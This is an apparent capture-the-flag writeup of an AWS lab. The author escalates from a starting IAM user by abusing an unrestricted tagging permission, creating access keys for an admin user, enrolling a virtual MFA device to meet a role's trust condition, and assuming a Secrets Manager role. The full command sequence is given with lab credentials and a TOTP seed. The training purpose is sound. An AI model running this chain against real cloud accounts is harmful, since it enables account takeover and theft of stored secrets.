---
title: "Rotation @ HackSmarter Writeup"
date: 2026-08-07
categories: [HackSmarter, Aws]
tags: [aws, mfa-bypass, tag-abuse, secrets-manager]
image:
  path: /assets/rotation.png
---

**PLatform:** [Hacksmarter](https://www.hacksmarter.org/)
**Lab:** [Rotation](https://www.hacksmarter.org/courses/f3c1e08a-6302-467d-8c74-4c18d74cead0)
**Difficulty:** Medium


## Objective

We have been hired to perform an AWS pentest against a client's infrastructure. They are in the process of rolling out a new standard user to all of their developers and have placed a flag in Secrets Manager to simulate a full compromise. The goal is to abuse our permissions, elevate access, and retrieve the secret.

For initial access, the client provided an Access Key and Secret for a starting user.

```
access_key : AKIAYR35WUFD2QHWLGSC
secret_key : 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
aws_account_id : 588137275719
```

## Configuring the Credentials

```bash
~> /hacksmarter/rotation aws configure --profile rotate
Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.

AWS Access Key ID [None]: AKIAYR35WUFD2QHWLGSC
AWS Secret Access Key [None]: 6gWgWSGiQgJYZhKxFMqIYmvVDBCEascLChHibx4F
Default region name [None]: us-east-1
Default output format [None]: 
```

```bash
~> /hacksmarter/rotation aws sts get-caller-identity --profile rotate
{
    "UserId": "AIDAYR35WUFD2KOTH5DII",
    "Account": "588137275719",
    "Arn": "arn:aws:iam::588137275719:user/manager_lab"
}
```

We are operating as `manager_lab`.

---

## Enumerating Permissions

```bash
~> /hacksmarter/rotation aws-enumerator dump --services iam

------------------------------------------------------------------------------------ IAM ------------------------------------------------------------------------------------

ListUsers
ListInstanceProfiles
ListOpenIDConnectProviders
ListSAMLProviders
ListGroups
ListAccountAliases
ListMFADevices
ListVirtualMFADevices
GetUser
GetAccountSummary
ListSigningCertificates
ListSSHPublicKeys
ListServerCertificates
ListAccessKeys
ListRoles
ListServiceSpecificCredentials
ListPolicies
GetAccountAuthorizationDetails
```

The account had a broad set of IAM read permissions, but two stood out immediately: `GetAccountAuthorizationDetails` and `TagResources`. The first lets us read the full permission set of every user in the account. The second lets us tag any IAM resource.

### Mapping All Users and Their Policies

```bash
~> /hacksmarter/rotation aws iam get-account-authorization-details --profile rotate | \
  jq '.UserDetailList[] | {UserName: .UserName, GroupList: .GroupList,
  AttachedManagedPolicies: .AttachedManagedPolicies,
  UserPolicyList: .UserPolicyList}'
```

Three users in the account: `admin_lab`, `developer_lab`, and `manager_lab` (our current user). Reading through each user's policy set revealed the full picture:

`admin_lab` had `IAMReadOnlyAccess` attached and an inline policy called `AssumeRoles` that allowed it to call `sts:AssumeRole` on
`arn:aws:iam::588137275719:role/cg_secretsmanager_lab`.

`developer_lab` had a `DeveloperViewSecrets` inline policy allowing `secretsmanager:ListSecrets` on everything, useful for listing what exists, but not reading values.

`manager_lab` (our user) had two inline policies worth understanding. The first, `SelfManageAccess`, allowed creating, deleting, and updating access keys and managing MFA devices, but only on users tagged with `aws:ResourceTag/developer: "true"`. The second, `TagResources`, allowed tagging and untagging any IAM resource with no conditions attached.

---

## Privilege Escalation

### Tagging manager_lab to Activate SelfManageAccess

I first checked whether our user already had the required tag.

```bash
~> /hacksmarter/rotation aws iam list-user-tags --user-name manager_lab --profile rotate
{
    "Tags": []
}
```

No tags. I added the `developer: true` tag using the unrestricted `TagResources` policy.

```bash
~> /hacksmarter/rotation aws iam tag-user --user-name manager_lab --tags Key=developer,Value=true --profile rotate
```

```bash
~> /hacksmarter/rotation aws iam list-user-tags --user-name manager_lab --profile rotate

{
    "Tags": [
        {
            "Key": "developer",
            "Value": "true"
        }
    ]
}
```

`SelfManageAccess` was now active for our user. We could create access keys for any user tagged `developer: true`, which we could also do ourselves through `TagResources`.

### Tagging admin_lab

I noted that `admin_lab` had the ability to assume the `cg_secretsmanager_lab` role so I moved on to tag `admin_lab`

```bash
~> /hacksmarter/rotation aws iam tag-user --user-name admin_lab --tags Key=developer,Value=true --profile rotate
```

### Create a New Access Key for admin_lab

Before creating a new key, I checked whether `admin_lab` already had any access keys. AWS allows a maximum of two per user.

```bash
~> /hacksmarter/rotation aws iam list-access-keys --user-name admin_lab --profile rotate
```

Two inactive keys already existed. I deleted one to make room.

```bash
~> /hacksmarter/rotation aws iam delete-access-key --user-name admin_lab \
  --access-key-id AKIAYR35WUFDSAHYHWPL --profile rotate
```

Then created a fresh key.

```bash
~> /hacksmarter/rotation aws iam create-access-key --user-name admin_lab --profile rotate
{
    "AccessKey": {
        "UserName": "admin_lab",
        "AccessKeyId": "AKIAYR35WUFDWLFZZNNU",
        "Status": "Active",
        "SecretAccessKey": "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"
    }
}
```

I configured these as a new profile.

```bash
~> /hacksmarter/rotation aws configure --profile admin_lab
```

### Attempting to Assume the Role

```bash
~> /hacksmarter/rotation aws sts assume-role \
  --role-arn arn:aws:iam::588137275719:role/cg_secretsmanager_lab \
  --role-session-name pentest --profile admin_lab
```

The AssumeRole failed because the role's trust policy required MFA, which admin_lab did not have enabled.

### Checking the requirements to assume the role

```bash
~> /hacksmarter/rotation aws iam get-role --role-name cg_secretsmanager_lab --profile rotate | \
  jq '.Role.AssumeRolePolicyDocument'

{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::588137275719:root"
      },
      "Action": "sts:AssumeRole",
      "Condition": {
        "Bool": {
          "aws:MultiFactorAuthPresent": "true"
        }
      }
    }
  ]
}
```

The condition was clear: `aws:MultiFactorAuthPresent: "true"`. The role would only accept an assumption that came with a valid MFA token. `admin_lab` had no MFA device enrolled.

Since `SelfManageAccess` was now active for `admin_lab` (we tagged it), and it included `iam:CreateVirtualMFADevice` and `iam:EnableMFADevice`, we could enroll MFA on their behalf.

### Creating and Enrolling a Virtual MFA Device

I created a virtual MFA device for `admin_lab` and saved the QR code.

```bash
~> /hacksmarter/rotation aws iam create-virtual-mfa-device \
  --virtual-mfa-device-name admin_lab_mfa \
  --bootstrap-method QRCodePNG \
  --outfile /tmp/qrcode.png --profile rotate

{
    "VirtualMFADevice": {
        "SerialNumber": "arn:aws:iam::588137275719:mfa/admin_lab_mfa"
    }
}
```

I decoded the QR code with `zbarimg` to extract the TOTP seed.

```bash
~> /hacksmarter/rotation zbarimg /tmp/qrcode.png

QR-Code:otpauth://totp/Amazon%20Web%20Services:admin_lab_mfa@cs-aws-lab-588137275719?secret=LQKWZYLCMQSUAHLL7ZSYI62JGDPF5TB7J2FNR7ZW3QYO3FLA2SBTUZXFOJT75D67&issuer=Amazon%20Web%20Services
scanned 1 barcode symbols from 1 images in 0.01 seconds
```

The decoded URI contained the TOTP secret. I used `pyotp` to generate two consecutive valid codes, sleeping 30 seconds between them as required by the `enable-mfa-device` API.

```python
import pyotp
import time

secret = 'LQKWZYLCMQSUAHLL7ZSYI62JGDPF5TB7J2FNR7ZW3QYO3FLA2SBTUZXFOJT75D67'
totp = pyotp.TOTP(secret)
print('Code 1:', totp.now())
time.sleep(30)
print('Code 2:', totp.now())
```

Using the two generated codes, I enabled MFA on admin_lab

```bash
~> /hacksmarter/rotation aws iam enable-mfa-device \
  --user-name admin_lab \
  --serial-number arn:aws:iam::588137275719:mfa/admin_lab_mfa \
  --authentication-code1 269975 \
  --authentication-code2 634796 \
  --profile rotate
```

### Assuming the Role with MFA

With MFA now enrolled on `admin_lab`, I retried the role assumption, this time providing the MFA serial number and a current TOTP code.

```bash
~> /hacksmarter/rotation aws sts assume-role \
  --role-arn arn:aws:iam::588137275719:role/cg_secretsmanager_lab \
  --role-session-name pentest \
  --profile admin_lab \
  --serial-number arn:aws:iam::588137275719:mfa/admin_lab_mfa \
  --token-code 634796

{
    "Credentials": {
        "AccessKeyId": "ASIAYR35WUFDZPQLWJKO",
        "SecretAccessKey": "DkWeEoIHg7q3VA+QpMntDxcrVZjfTFt26X7RBtmt",
        "SessionToken": "IQoJb3JpZ2luX2VjEJD//////////wEaCXVzLWVhc3QtMSJHMEUCIB3KWiocNn/SypO/V3/gJl0Sx7m2Os/Vq9X5HreXO/p6AiEA5pNZ95eIr1N/gECN6QTJyJE9465xkZa9a6zqjC8/xRMqlAIIWRAAGgw1ODgxMzcyNzU3MTkiDHR06xxLu0UbHJddeCrxAV1Boa7Leq05M8Yes6IBYA+dW7KqWi9o6NlVnwwErytPD/ssu1TksZd29+7BNxgKlpx4CcFVEF2a/yjCfWeONDONXP8Us8IgiKHz9lJRUGq4Mrj0094Gh5DYC3TouEclo7bBcVW0FLtna6EBtOLvTfJxp7n5uOeHw6RcMDR+egfv8inGhUPpv79boZrkpszkBG3dnBJZzX/wnk0bUv10XTcU//TyfaTHWOpHfH9PUiMNfiKOjhNi4pO1NxeyYHiZ+YQ4gkLd/G7DX/f39bxIyz8RYesXKh0P+ihdKcggbyEyHVsBj4e0EweyEoNR3l3NIRcw2fTX0wY6nQFQ/cZJP7R0TMJsTEsNu/brxCfYBgfNGKpZq7OfEmVSG8vFsZXdcO1ViM2WCSL8loaIuQ6SaTnMBOz2drRyPEbAsenkY34lEDmXPahZzi8XzQoPv98imGXKr7zPVVUzTUrqFQmA3wUC8PSyDzgms5lIlFqpS10o2ok+Xo3Jz1xt5kFETC+pOISQZEOc99PYGyHxEVrVRz7nc1Etb/SZ",
        "Expiration": "2026-08-07T16:31:37+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAYR35WUFDRV6HR7GHD:pentest",
        "Arn": "arn:aws:sts::588137275719:assumed-role/cg_secretsmanager_lab/pentest"
    }
}
```

Temporary credentials returned for the `cg_secretsmanager_lab` role. I configured them as a new profile.

---

## Retrieving the Secrets

Using the temporary credentials from the assumed role, I listed secrets and retrieved the value.

```bash
~> /hacksmarter/rotation aws secretsmanager list-secrets --region us-east-1

{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:588137275719:secret:cg_secret_lab-njqNzB",
            "Name": "cg_secret_lab",
            "Description": "The primary secret for the iam_privesc_by_key_rotation scenario",
            "LastChangedDate": "2026-08-07T15:34:57.875000+01:00",
            "LastAccessedDate": "2026-08-07T01:00:00+01:00",
            "SecretVersionsToStages": {
                "terraform-8hum2SWkeOaLavOQl6sUg2jdA2": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2026-08-07T15:34:57.677000+01:00"
        }
    ]
}
```

One secret: `cg_secret_lab`.

```bash
~> /hacksmarter/rotation aws secretsmanager get-secret-value --secret-id cg_secret_lab --region us-east-1

```
